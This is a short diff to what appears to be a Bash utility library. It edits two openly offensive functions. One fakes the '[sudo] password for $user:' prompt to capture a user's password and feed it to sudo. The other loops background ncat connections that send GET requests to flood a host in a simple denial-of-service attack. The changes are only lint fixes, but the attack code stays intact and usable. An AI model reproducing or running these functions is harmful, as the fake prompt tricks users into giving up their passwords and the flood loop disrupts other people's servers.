@@ -76,8 +76,9 @@ bl_cracking_grab_sudo_password() {
     local user="$(whoami)"
     local buffer_file_path="$(mktemp)"
     for number in 1 2 3; do
-        read -sp "[sudo] password for $user: " password
+        read -rsp "[sudo] password for $user: " password
         echo ''
+        # shellcheck disable=SC1117
         if echo -e "${password}\n" | \
             sudo -S "$@" 1>"$buffer_file_path" 2>/dev/null
         then
@@ -109,6 +110,7 @@ bl_cracking_make_simple_ddos_attack() {
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
+        # shellcheck disable=SC1117
         echo -e "GET /$index\r\n\r\n" | ncat lilu "$2" &
     done
     return $?
